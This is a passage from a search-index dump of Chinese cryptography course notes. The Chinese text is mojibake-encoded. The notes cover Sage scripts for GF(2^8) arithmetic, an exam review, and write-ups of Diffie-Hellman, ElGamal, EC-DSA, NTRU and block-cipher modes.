self.FF.fetch_int(0x11), self.FF.fetch_int(0xff)   def solve1(self):  res = self.l1 * self.r1  print \u0026#34;\\t%d= %s\u0026#34; % (self.l1.integer_representation(), self.l1)  print \u0026#34;*\\t%d= %s\u0026#34; % (self.r1.integer_representation(), self.r1)  print \u0026#34;=\\t%d= %s\u0026#34; % (res.integer_representation(), res)  print \u0026#34;mod\\t%s\\n\u0026#34; % self.FF.modulus()   def solve2(self):  res = self.l2 * self.r2  print \u0026#34;\\t%d= %s\u0026#34; % (self.l2.integer_representation(), self.l2)  print \u0026#34;*\\t%d= %s\u0026#34; % (self.r2.integer_representation(), self.r2)  print \u0026#34;=\\t%d= %s\u0026#34; % (res.integer_representation(), res)  print \u0026#34;mod\\t%s\\n\u0026#34; % self.FF.modulus()   if __name__ == \u0026#34;__main__\u0026#34;:  s = Solve()  s.solve1()  s.solve2() è¿è¡Œç»“æœï¼š\n$ python solve-1.py \t183 = x^7 + x^5 + x^4 + x^2 + x + 1 *\t63 = x^5 + x^4 + x^3 + x^2 + x + 1 =\t115 = x^6 + x^5 + x^4 + x + 1 mod\tx^8 + x^4 + x^3 + x + 1  \t17 = x^4 + 1 *\t255 = x^7 + x^6 + x^5 + x^4 + x^3 + x^2 + x + 1 =\t150 = x^7 + x^4 + x^2 + x mod\tx^8 + x^4 + x^3 + x + 1 ç¬¬äºŒé¢˜ #   è®¾ $$a(x) = 0x1Bx^3 + 0x03x^2 + 0xDD*x + 0xA1$$ï¼Œä¸ $$b(x) = 0xAC * x^3 + 0xF0 * x + 0x2D$$ï¼Œä¸ºç³»æ•°åœ¨ $$GF(2^8)$$ ä¸Šçš„ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œè®¡ç®— $$a(x) \\otimes b(x) \\pmod{x^4 + 1}$$\n #!/usr/bin/env python2 from sage.all import *  class Solve:  def __init__(self):  c = PolynomialRing(GF(2), names=\u0026#39;c\u0026#39;).gen()  self.xPR = PolynomialRing(ZZ, names=\u0026#39;x\u0026#39;)  self.cFF = GF(2**8, names=\u0026#34;c\u0026#34;, modulus=c**8 + c**4 + c**3 + c + 1)  self.yPR = PolynomialRing(self.cFF, names=\u0026#39;y\u0026#39;)  x, y = self.xPR.gen(), self.yPR.gen()   self.f1_x, self.f2_x = 0x1B * x**3 + 0x03 * x**2 + 0xDD*x + 0xA1, 0xAC * x**3 + 0xF0 * x + 0x2D  self.f1_y, self.f2_y = self.x2y(self.f1_x), self.x2y(self.f2_x)  self.base_poly = self.x2y(x**4 + 1)   def x2y(self, x_poly):  return self.yPR([self.cFF.fetch_int(c) for c in x_poly.list()])   def y2x(self, y_poly):  return self.xPR([c.integer_representation() for c in y_poly.list()])   def display_x(self, x):  Fstring = \u0026#34;\\\\begin{bmatrix}%s\\end{bmatrix}\u0026#34;  fstring = \u0026#34;%x\u0026amp;* x^{%d}\u0026#34;  return Fstring % \u0026#39;\\\\\\\\\u0026#39;.join([  fstring % (coff, ind) for ind,coff in enumerate(x.list())  ][::-1])   def display_y(self, y):  Fstring = \u0026#34;\\\\begin{bmatrix}%s\\end{bmatrix}\u0026#34;  fstring = \u0026#34;(%s) \u0026amp;* x^{%d}\u0026#34;  return Fstring % \u0026#39;\\\\\\\\\u0026#39;.join([  fstring % (coff, ind) for ind, coff in enumerate(y.list())  ][::-1])   def solve(self):  res_y = self.f1_y * self.f2_y % self.base_poly  res_x = self.y2x(res_y)  print \u0026#34;\\t%s\\n\\t%s\\n\u0026#34; %( self.display_x(self.f1_x), self.display_y(self.f1_y) )  print \u0026#34;\\odot\\t%s\\n\\t%s\\n\u0026#34; % ( self.display_x(self.f2_x), self.display_y(self.f2_y) )  print \u0026#34;=\\t%s\\n\\t%s\\n\u0026#34; % ( self.display_x(res_x), self.display_y(res_y) )  print \u0026#34;mod\\t%s\u0026#34; % self.y2x(self.base_poly)  if __name__ == \u0026#34;__main__\u0026#34;:  s = Solve()  s.solve() è¿è¡Œç»“æœï¼š\n$ python solve-2.py \t\\begin{bmatrix} 1b \u0026amp;* x^{3}\\\\3 \u0026amp;* x^{2}\\\\dd \u0026amp;* x^{1}\\\\a1 \u0026amp;* x^{0} \\end{bmatrix} \t\\begin{bmatrix} (c^4 + c^3 + c + 1) \u0026amp;* x^{3}\\\\(c + 1) \u0026amp;* x^{2}\\\\(c^7 + c^6 + c^4 + c^3 + c^2 + 1) \u0026amp;* x^{1}\\\\(c^7 + c^5 + 1) \u0026amp;* x^{0} \\end{bmatrix}  \\odot\t\\begin{bmatrix} ac \u0026amp;* x^{3}\\\\0 \u0026amp;* x^{2}\\\\f0 \u0026amp;* x^{1}\\\\2d \u0026amp;* x^{0} \\end{bmatrix} \t\\begin{bmatrix} (c^7 + c^5 + c^3 + c^2) \u0026amp;* x^{3}\\\\(0) \u0026amp;* x^{2}\\\\(c^7 + c^6 + c^5 + c^4) \u0026amp;* x^{1}\\\\(c^5 + c^3 + c^2 + 1) \u0026amp;* x^{0} \\end{bmatrix}  =\t\\begin{bmatrix} 72 \u0026amp;* x^{3}\\\\12 \u0026amp;* x^{2}\\\\5a \u0026amp;* x^{1}\\\\18 \u0026amp;* x^{0} \\end{bmatrix} \t\\begin{bmatrix} (c^6 + c^5 + c^4 + c) \u0026amp;* x^{3}\\\\(c^4 + c) \u0026amp;* x^{2}\\\\(c^6 + c^4 + c^3 + c) \u0026amp;* x^{1}\\\\(c^4 + c^3) \u0026amp;* x^{0} \\end{bmatrix}  mod\tx^4 + 1 "},{"id":255,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/summary/","title":"Summary","section":"å¯†ç å­¦","content":"å¯†ç å­¦æœŸæœ«å¤ä¹  #  éšæœºæ•°å‘ç”Ÿå™¨ #  é‡ç‚¹ï¼šçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ã€è½¬ç§»çŸ©é˜µã€ç‰¹å¾å¤šé¡¹å¼ã€m-åºåˆ—ã€Golomb ä¼ªéšæœºæ€§\nGolomb éšæœºæ€§å…¬è®¾ï¼š\n GF(2) ä¸Šçš„ n é•¿ m-sequence {ai} åº”è¯¥æ»¡è¶³ä¸‹é¢çš„ä¸‰ä¸ªæ¡ä»¶ï¼š  åœ¨ä¸€ä¸ªå‘¨æœŸå†…ï¼Œ0ã€1 å‡ºç°çš„æ¬¡æ•°åˆ†åˆ«æ˜¯ $$2^{n-1} - 1$$ å’Œ $$2^{n - 1}$$ï¼› åœ¨ä¸€ä¸ªå‘¨æœŸå†…ï¼Œæ€»æ¸¸ç¨‹æ•°ä¸º $$2^{n-1}$$ï¼›å¯¹é•¿ä¸º $$i (1 \\le i \\le n-1)$$ çš„æ¸¸ç¨‹æœ‰ $$2^{n-1-i}$$ ä¸ªï¼Œ0ã€1 å„åŠï¼› $${a_i}$$ çš„è‡ªç›¸å…³å‡½æ•°ä¸º $$\\displaystyle R(\\tau) = \\begin{cases} 1, \u0026amp; \\tau = 0 \\\\displaystyle -\\frac{1}{2^n - 1}, \u0026amp; 0 \u0026lt; \\tau \\le 2^n - 2 \\end{cases}$$    è‡ªç›¸å…³å‡½æ•°ï¼š\n GF(2) ä¸Šå‘¨æœŸä¸º T çš„åºåˆ— $${a_i}$$ çš„è‡ªç›¸å…³å‡½æ•°å®šä¹‰ä¸ºï¼š $$\\displaystyle R(\\tau) = \\frac{1}{T} \\sum_{k = 1}^{T} (-1)^{a_k} (-1)^{a_{k+\\tau}}$$  æµå¯†ç  #  æµå¯†ç çš„åŠ å¯†åŸç†ï¼šå°†æ˜æ–‡æ¯”ç‰¹æµ m ä¸éšæœºæ¯”ç‰¹æµ k æŒ‰ä½å¼‚æˆ–å¾—åˆ°åŠ å¯†æ¯”ç‰¹æµ cï¼›\néšæœºæ¯”ç‰¹æµé€šå¸¸æ˜¯ç”±å¤šä¸ª LFSRï¼Œé€šè¿‡ä¸€äº›æ–¹å¼ç»„åˆè€Œæˆï¼š\n Geffe åºåˆ—ç”Ÿæˆå™¨ã€JK è§¦å‘å™¨ã€Pless è§¦å‘å™¨ã€é’Ÿæ§åºåˆ—ç”Ÿæˆå™¨  ä¸€äº›å¸¸è§çš„æµå¯†ç ï¼š\n æ‰‹æœºé€šä¿¡çš„åŠ å¯†æ–¹å¼ A5/1ã€è“ç‰™çš„åŠ å¯†æ–¹å¼ E0ã€WiFi-WEP çš„åŠ å¯†æ–¹å¼ RC4ï¼›  åˆ†ç»„å¯†ç  #  åˆ†ç»„å¯†ç å¸¸ç”¨çš„æ–¹æ³•ï¼š\n ä»£æ¢ï¼šä¸€ä¸ªç¦»æ•£å¯é€†å‡½æ•°ï¼› æ‰©æ•£å’Œæ··æ·†ï¼šé¦™å†œæå‡ºçš„å¯†ç è®¾è®¡ä¸¤ä¸ªåŸºæœ¬æ–¹æ³•ã€‚æ‰©æ•£ç ´åæ˜æ–‡å’Œå¯†æ–‡çš„ç»Ÿè®¡å…³ç³»ï¼Œæ··æ·†ç ´åå¯†é’¥å’Œå¯†æ–‡çš„ç»Ÿè®¡å…³ç³»ï¼› Feistel åŠ å¯†ç»“æ„ï¼š  å°†æ˜æ–‡åˆ†ä¸º Lã€R å·¦å³ä¸¤ä¸ªéƒ¨åˆ†ï¼Œè¿›è¡Œå¤šè½®è¿­ä»£è®¡ç®—ã€‚æ¯è½®è®¡ç®—é€šè¿‡ä¸‹é¢çš„æ–¹å¼ï¼š $$L_i = R_{i-1}$$ã€$$R_i = L_{i-1} \\oplus F(R_{i-1}, K_i)$$    åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼ï¼š\n ECB(Electronic Code Book)ï¼šç”µå­å¯†ç æœ¬æ¨¡å¼ï¼› CBC(Cipher Block Chaining)ï¼šå¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼› CFB(Cipher FeedBack)ï¼šå¯†ç åé¦ˆæ¨¡å¼ï¼› OFB(Ouput FeedBack)ï¼šè¾“å‡ºåé¦ˆæ¨¡å¼ï¼›  ä¸€äº›å¸¸è§çš„åˆ†ç»„å¯†ç ï¼š\n DES(Data Encryption Standard)ï¼šç”± IBM å…¬å¸ç ”åˆ¶ï¼Œæœ€åˆæ˜¯ Luciffer å¯†ç çš„å‘å±•å’Œä¿®æ”¹ï¼› IDEA(International Data Encryption Algorithm)ï¼šç”± X.J.Lai ä¸ J.L.Massey æå‡ºï¼Œå½“æ—¶è¢«ç§°ä¸º PES(Proposed Encryption Standard)ï¼›åœ¨å·®åˆ†å¯†ç åˆ†ææå‡ºä¹‹ååˆæ”¹è¿›ä¸º IPESï¼Œæœ€åæ›´åä¸º IDEAï¼› AES(Advanced Encryption Standard)ï¼šå¤šä¸ªæœºæ„æå‡ºã€æ”»å‡»ã€é€‰ä¸¾çš„ç»“æœï¼Œæœ€åˆåä¸º Rijndaelï¼› ç¥–å†²ä¹‹å¯†ç ï¼ˆZUCï¼‰ï¼šå›½å®¶ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤ç ”åˆ¶ï¼Œ2011 å¹´ 9 æœˆæˆä¸º LTE 4G å›½é™…æ ‡å‡†ï¼› SM4ï¼šä¸­å›½å•†ç”¨å¯†ç ç®—æ³•ï¼Œç”¨äº WEPI çš„åˆ†ç»„å¯†ç ç®—æ³•ï¼›  å…¬é’¥å¯†ç  #  å¸¸è§çš„å…¬é’¥å¯†ç ï¼š\n RSA ç®—æ³•ã€èƒŒåŒ…å¯†ç ä½“åˆ¶ã€Robin å¯†ç ä½“åˆ¶ã€ElGamal æ¤­åœ†æ›²çº¿å¯†ç ä½“åˆ¶ã€SM2 æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼›  æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•å’Œå€ä¹˜è¿ç®—ï¼š\n  å¯¹äºæ¤­åœ†æ›²çº¿ $$E_p(a, b): y^2 \\equiv x^3 +ax +b \\pmod{p}$$ã€‚è®¾ $$P_1 = (x_1, y_1), P_2 = (x_2, y_2)$$ æ˜¯ä¸Šå¼‚äºæ— ç©·è¿œç‚¹ O çš„ä¸¤ä¸ªç‚¹ã€‚åˆ™ï¼š\nè´Ÿå…ƒå…¬å¼ï¼š$$-P_1 = (x_1, y_1)$$\nåŠ æ³•å…¬å¼ï¼šè€ƒè™‘ $$P_3 = (x_3, y_3) = P_1 + P_2$$ï¼š\n å¯å¾— $$\\begin{cases} x_3 = k^2 -x_1 - x_2 \\ y_3 = k(x_1 - x_3) - y_1\\end{cases}$$ï¼Œå…¶ä¸­ $$k = \\begin{cases}\\displaystyle \\frac{y_2 - y_1}{x_2 - x_1} \u0026amp; x_1 \\not= x_2 \\ \\displaystyle \\frac{3x_1^2 + a}{2y_1} \u0026amp; x_1 = x_2\\end{cases}$$    å¯†ç åˆ†é… #  å…¬é’¥çš„åˆ†é…æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š\n å…¬å¼€å‘å¸ƒã€å…¬ç”¨ç›®å½•è¡¨ã€å…¬é’¥ç®¡ç†æœºæ„ã€å…¬é’¥è¯ä¹¦ï¼›  ç§˜å¯†åˆ†å‰²ï¼š\n Shamir é—¨é™æ–¹æ¡ˆã€åŸºäºä¸­å›½å‰©ä½™å®šç†çš„é—¨é™æ–¹æ¡ˆï¼›  "},{"id":256,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/diffiehellman/","title":"Diffie Hellman","section":"å…¬é’¥å¯†ç ä½“åˆ¶","content":"Diffie Hellman Key Exchange #  DHï¼šDH å¯†é’¥äº¤æ¢ç”¨äºåœ¨å…¬å¼€ä¿¡é“ä¸Šå…±äº«ç§å¯†ä¿¡æ¯\nç®—æ³•çš„æµç¨‹ #  ç³»ç»Ÿå‚æ•° #  ç³»ç»Ÿçš„è¿è¡Œéœ€è¦ç¡®å®šä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š\n ä¸€ä¸ªå¤§ç´ æ•° pï¼› ä¸€ä¸ªæ•´æ•° gï¼›  ä¿¡æ¯ç”Ÿæˆ #  è¿›è¡Œä¿¡æ¯äº¤æ¢çš„åŒæ–¹éœ€è¦ç¡®å®šä»¥ä¸‹çš„ä¿¡æ¯ï¼š\n åŒæ–¹åˆ†åˆ«ç”Ÿæˆä¸¤ä¸ªç§˜å¯†ä¿¡æ¯ $$X_A, X_B$$ é€šè¿‡ç§˜å¯†ä¿¡æ¯ä¸æ•´æ•° g è®¡ç®—ï¼š$$g^{X_A}, g^{X_B}$$  ç§˜å¯†å…±äº« #  æ”¶åˆ°å…¬å¼€ä¿¡é“çš„ä¿¡æ¯çš„åŒæ–¹è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š\n A è®¡ç®—å¾—åˆ°ç§˜å¯†å…±äº«ä¿¡æ¯ï¼š$$s = (g^{X_B})^{X_A} = g^{X_AX_B}$$ B è®¡ç®—å¾—åˆ°ç§˜å¯†å…±äº«ä¿¡æ¯ï¼š$$s = (g^{X_A})^{X_B} = g^{X_AX_B}$$  æµç¨‹å›¾ #  "},{"id":257,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/elgamal/","title":"El Gamal","section":"å…¬é’¥å¯†ç ä½“åˆ¶","content":" å‚è€ƒï¼š\n https://resources.saylor.org/wwwresources/archived/site/wp-content/uploads/2011/03/ElGamal-signature-scheme.pdf   ElGamal signature scheme #  ç®—æ³•çš„æµç¨‹ #  ç³»ç»Ÿå‚æ•° #  ç³»ç»Ÿéœ€è¦ä¸€ä¸‹åœ¨å„ä¸ªä½¿ç”¨è¿™ä¸ªç³»ç»Ÿçš„ä½¿ç”¨è€…ä¹‹é—´å…±äº«ä¸‰ä¸ªä¿¡æ¯ï¼š\n H æ˜¯ä¸€ä¸ªæŠ—ç¢°æ’çš„å“ˆå¸Œå‡½æ•°ï¼› p æ˜¯ä¸€ä¸ªå¤§ç´ æ•°ï¼Œè§£å†³ p çš„ç¦»æ•£å¯¹æ•°é—®é¢˜æ˜¯å›°éš¾çš„ã€‚ g æ˜¯åœ¨ä¹˜æ³•ç¾¤ $$\\Z^*_p$$ ä¸­éšæœºé€‰å–çš„ç”Ÿæˆå…ƒã€‚  å¯†é’¥ç”Ÿæˆ #  ç­¾åè€…éœ€è¦é€šè¿‡è¿™ä¸ªç³»ç»Ÿå¯¹ä¸€ä¸ªæ¶ˆæ¯è¿›è¡Œç­¾åï¼Œéœ€è¦ç”Ÿæˆä»¥ä¸‹çš„ä¿¡æ¯ï¼š\n éšæœºé€‰å–çš„æ•´æ•° x æ»¡è¶³ $$1 \u0026lt; x \u0026lt; p-1$$ è®¡ç®—ä»¥ä¸‹ä¿¡æ¯ï¼š$$y \\equiv g^x \\pmod{p}$$ å°è£…å…¬é’¥ï¼š$$(y)$$ï¼›å°è£…ç§é’¥ $$(x)$$  ç­¾åè¿‡ç¨‹ #  ç­¾åè€…é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼š\n éšæœºé€‰å–ä¸€ä¸ªæ•´æ•° k æ»¡è¶³ $$0 \u0026lt; k \u0026lt; p-1 \\and gcd(k, p-1) = 1$$ è®¡ç®— $$r = g^k \\pmod{p}$$ è®¡ç®— $$s = (H(m) - xr)k^{-1} \\pmod{p-1}$$ï¼ˆå³ s æ»¡è¶³ $$H(m) = xr + ks \\pmod{p-1}$$ï¼‰ å¦‚æœè®¡ç®—å¾—åˆ° s=0ï¼Œåˆ™é‡æ–°é€‰å–éšæœºæ•° kã€‚ å°è£… $$(r, s)$$ å³æ˜¯æ‹¥æœ‰ç§é’¥ x çš„ç­¾åè€…å¯¹ä¿¡æ¯ m çš„ç­¾åã€‚  éªŒè¯ç­¾å #  éªŒè¯ä¸€ä¸ªç­¾åçš„æµç¨‹å¦‚ä¸‹ï¼š\n é¦–å…ˆéœ€è¦ä¸ç­‰å¼æ’æˆç«‹ $$0 \u0026lt; r \u0026lt; p \\and 0 \u0026lt; s \u0026lt; p - 1$$ å¦‚æœç­‰å¼ $$g^{H(m)} \\equiv y^r r^s \\pmod{p}$$ æˆç«‹ï¼Œåˆ™æ¥å—è¿™ä¸ªç­¾åã€‚  å®‰å…¨æ€§çš„è¯´æ˜ #  æ­£ç¡®æ€§ #  éªŒè¯ç­¾åçš„åŠæ³•æ˜¯æ­£ç¡®çš„ã€‚\né€šè¿‡ç­¾åçš„ç”Ÿæˆæ–¹å¼æˆ‘ä»¬çŸ¥é“ä»¥ä¸‹çš„ç»“è®ºï¼š$$H(m) = xr + ks \\pmod{p-1}$$\né€šè¿‡è´¹é©¬å°å®šç†æˆ‘ä»¬å¯ä»¥å¾—åˆ°ï¼š\n $$g^{H(m)} \\equiv g^{xr}g^{ks} \\equiv y^r r^s \\pmod{p}$$  ä¸å¯å¦è®¤æ€§ #  "},{"id":258,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ellipticcurve/","title":"Elliptic Curve","section":"å…¬é’¥å¯†ç ä½“åˆ¶","content":"Elliptic Curve DSA #  Elliptic Curve #  ç³»ç»Ÿå‚æ•° #  å¦‚ä½•ç¡®å®šä¸€ä¸ª ECCï¼š\n  é€‰æ‹©ä¸€ä¸ªç´ æ•° p å’Œä¸€ä¸ªæ•´æ•° nã€‚ä»æœ‰é™åŸŸ $$\\mathbb{F}p$$ ä¸­é€‰æ‹©ä¸€ä¸ªæ¬¡æ•°ä¸º n ä¸å¯çº¦å¤šé¡¹å¼ f(x)ï¼Œå¹¶ä¸”ç”¨è¿™ä¸ªä¸å¯çº¦å¤šé¡¹å¼å¾—åˆ°ä¸€ä¸ªæœ‰é™åŸŸ $$\\mathbb{F}{p^n}$$ï¼Œè®¾ f(x) åœ¨è¯¥æœ‰é™åŸŸä¸‹çš„æ ¹ä¸º $$\\alpha$$ï¼›\n  åœ¨æœ‰é™åŸŸ $$\\mathbb{F}_{p^n}$$ ä¸­ç”Ÿæˆä¸€ä¸ªéè¶…å¥‡å¼‚ï¼ˆnon-supersingularï¼‰æ›²çº¿ Eï¼›\n  åœ¨ E ä¸Šé€‰æ‹©ä¸€ä¸ªé˜¶ä¸ºç´ æ•°çš„ç‚¹ $$P=(x,y)$$ï¼Œè®¾å…¶é˜¶ä¸º qï¼›\n  å®šä¹‰ä¸€ä¸ªè½¬åŒ–å‡½æ•° $$c(x): \\mathbb{F}{p^n} \\rightarrow \\Z{p^n}$$ã€‚å…·ä½“çš„å®šä¹‰ä¸ºï¼š\n$$\\displaystyle c(x) = \\sum_{i=0}^{n-1} c_i p^i \\in \\Z_{p^n}, \\text{for } x= \\sum_{i=0}^{n-1}c_i \\alpha^i \\in \\mathbb{F}_{p^n}, 0 \\le c_i \u0026lt; p$$\n  åŸŸä¸Šçš„è¿ç®— #  DSA ç­¾åç®—æ³• #  ç³»ç»Ÿå‚æ•° #  ç³»ç»Ÿéœ€è¦åˆå§‹åŒ–ä»¥ä¸‹ä¿¡æ¯ä¾›æ‰€æœ‰ç³»ç»Ÿçš„ä½¿ç”¨è€…å…±äº«ï¼š\n é€‰æ‹©ä¸€ä¸ªæ¤­åœ†æ›²çº¿ ECï¼š é€‰æ‹©ä¸€ä¸ªå®‰å…¨çš„å“ˆå¸Œå‡½æ•° h(x)ï¼›  å¯†é’¥ç”Ÿæˆ #  ç­¾åè€…ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿéœ€è¦é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼š\n éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•° d æ»¡è¶³ $$0 \u0026lt; d \u0026lt; q$$ åœ¨æ¤­åœ†æ›²çº¿ E ä¸Šè®¡ç®— $$Q = dP = (x_d, y_d)$$ å°è£…å…¬é’¥ $$(x_d, y_d)$$ï¼Œå°è£…ç§é’¥ $$(d)$$  ç­¾åè¿‡ç¨‹ #  ç­¾åè€…é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è¿›è¡Œç­¾åï¼š\n éšæœºé€‰å–ä¸€ä¸ªæ•´æ•° k æ»¡è¶³ $$0 \u0026lt; k \u0026lt; q$$ï¼Œå¹¶è®¡ç®— $$R = kP = (x_k, y_k)$$ é€šè¿‡ç³»ç»Ÿä¸­çš„å‡½æ•° c(x) è®¡ç®— rï¼Œå³ï¼š$$r = c(x_k)$$ è®¡ç®—æ»¡è¶³ä»¥ä¸‹æ–¹ç¨‹çš„ sï¼š$$h(m) \\equiv dr + ks \\pmod{q}$$ å°è£…ä¿¡æ¯ m çš„ç­¾å $$(r, s)$$ã€‚  éªŒè¯ç­¾å #  éªŒè¯ç­¾åçš„æµç¨‹å¦‚ä¸‹ï¼š\n è®¡ç®—ä»¥ä¸‹çš„ä¸‰ä¸ªæ•°å­—ï¼š$$\\begin{cases} t = s^{-1} \\pmod{q}\\ u = h(m) \\cdot t \\pmod{q}\\ v = -t \\cdot r \\pmod{q} \\end{cases}$$ åœ¨æ¤­åœ†æ›²çº¿ä¸­è®¡ç®—ä¸‹é¢çš„ç‚¹ $$uP + vQ = u(x,y) + v(x_d,y_d)=(x_k, y_k)$$ åˆ¤æ–­ä»¥ä¸‹ç­‰å¼æ˜¯å¦æˆç«‹ï¼Œæˆç«‹åˆ™æ¥å—è¿™ä¸ªç­¾å $$r = c(x_k) \\pmod{q}$$  "},{"id":259,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ntru/","title":"Ntru","section":"å…¬é’¥å¯†ç ä½“åˆ¶","content":" å‚è€ƒï¼š\n http://people.scs.carleton.ca/~maheshwa/courses/4109/Seminar11/NTRU_presentation.pdf   NTRU Cryptosystem #  NTRU: Nth degree Truncated polynomial Ring Units. Or $$\\displaystyle R = \\frac{Z[X]}{X^{N-1}}$$\nç®—æ³•çš„æµç¨‹ #  ç³»ç»Ÿå‚æ•° #  ç³»ç»Ÿéœ€è¦ä¸€ä¸‹åœ¨å„ä¸ªä½¿ç”¨è¿™ä¸ªç³»ç»Ÿçš„ä½¿ç”¨è€…ä¹‹é—´å…±äº«ä¸‰ä¸ªä¿¡æ¯ï¼š\n N\u0026amp;Rï¼šN æ˜¯ä¸€ä¸ªæ•´æ•°ã€R æ˜¯ä¸€ä¸ªç¯ï¼Œåœ¨ç¯ R ä¸Šçš„å¤šé¡¹å¼æ¬¡æ•°å‡ä¸º N-1ï¼› pï¼šä¸€ä¸ªå°æ•´æ•°ã€‚å¤šé¡¹å¼å¯¹ p ç³»æ•°å–æ¨¡å¾—åˆ°ä¸€ä¸ªæ¨¡ç¯ï¼› qï¼šä¸€ä¸ªä¸ p äº’ç´ çš„å¤§æ•´æ•°ã€‚å¤šé¡¹å¼å¯¹ q ç³»æ•°å–æ¨¡å¾—åˆ°ä¸€ä¸ªæ¨¡ç¯ï¼›  å¯†é’¥ç”Ÿæˆ #  ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿçš„ç”¨æˆ·éœ€è¦é€šè¿‡ä¸€ä¸‹çš„æ–¹å¼ç”Ÿæˆå…¬é’¥ä¸ç§é’¥ï¼š\n  ä» R ä¸­éšæœºé€‰å–ä¸¤ä¸ªå¯é€†å¤šé¡¹å¼ f, gï¼›\n  è®¡ç®— f å…³äº p,q çš„é€†ï¼š$$f \\cdot f_p \\equiv 1 \\pmod{p}, f \\cdot f_q \\equiv 1 \\pmod{q}$$\n  è®¡ç®—ä¸‹é¢çš„å¤šé¡¹å¼ç§¯ï¼š$$h = p \\cdot f_q \\cdot g \\pmod{q}$$\n  å°è£…ç§é’¥ $$(f, f_p)$$ï¼Œå°è£…å…¬é’¥ $$(h)$$\n  åŠ å¯†æµç¨‹ #  ä¸€ä¸ªç”¨æˆ· A å¾—åˆ°äº† B çš„å…¬é’¥ï¼Œæƒ³å‘ B å‘é€ä¸€æ¡ä¿¡æ¯ï¼Œé€šè¿‡ä¸‹é¢çš„æ–¹å¼ï¼š\n å°†æ˜æ–‡ m è¡¨ç¤ºä¸ºæ¨¡ p ç¯å¤šé¡¹å¼çš„å½¢å¼ï¼Œå¤šé¡¹å¼çš„ç³»æ•°é€‰åœ¨åŒºé—´ $$\\displaystyle (-\\frac{p}{2}, \\frac{p}{2})$$ ä¹‹ä¸­ï¼› éšæœºé€‰å–ä¸€ä¸ªå¤šé¡¹å¼ rï¼› ç”¨ä»¥ä¸‹çš„æ–¹å¼è®¡ç®—å¯†æ–‡ï¼š$$e = r \\cdot h + m \\pmod{q}$$ï¼›  è§£å¯†æµç¨‹ #  B æ”¶åˆ°äº†æ¥è‡ª A çš„åŠ å¯†ä¿¡æ¯å°†é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è§£å¯†ï¼š\n B ç§é’¥ä¸­æœ‰ä¸€ä¸ªç§æœ‰çš„å¤šé¡¹å¼ fï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼è®¡ç®—å¤šé¡¹å¼ aï¼š$$a \\equiv f \\cdot e \\pmod{q}$$ï¼Œå…¶ä¸­å¤šé¡¹å¼çš„ç³»æ•°é€‰åœ¨åŒºé—´ $$\\displaystyle (-\\frac{q}{2}, \\frac{q}{2})$$ ä¹‹ä¸­ï¼› åœ¨é€šè¿‡å°ç´ æ•° p è®¡ç®—ï¼š$$b \\equiv a \\pmod{p}$$ æœ€åä½¿ç”¨ç§é’¥ä¸­çš„å¤šé¡¹å¼ $$f_p$$ å³å¯å¾—åˆ°æ˜æ–‡ï¼š$$c \\equiv f_p \\cdot b \\pmod{p}$$  "},{"id":260,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/","title":"å·¥ä½œæ¨¡å¼","section":"åˆ†ç»„å¯†ç ä½“åˆ¶","content":" å‚è€ƒï¼š\n https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E5%A1%AB%E5%85%85   åˆ†ç»„å¯†ç å·¥ä½œæ¨¡å¼ #  ç”µå­å¯†ç æœ¬ EBC #   +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +-------|--------+ +-------|---------+ | | v v +-------------------------+ +-------------------------+\rkey----\u0026gt;| block cipher encryption | key----\u0026gt;| block cipher encryption |\r+------------|------------+ +------------|------------+\r| | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ å¯†ç åˆ†ç»„è¿æ¥ CBC #   +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +--------+-------+ +--------+--------+ | | v v iv-----------------\u0026gt;xor 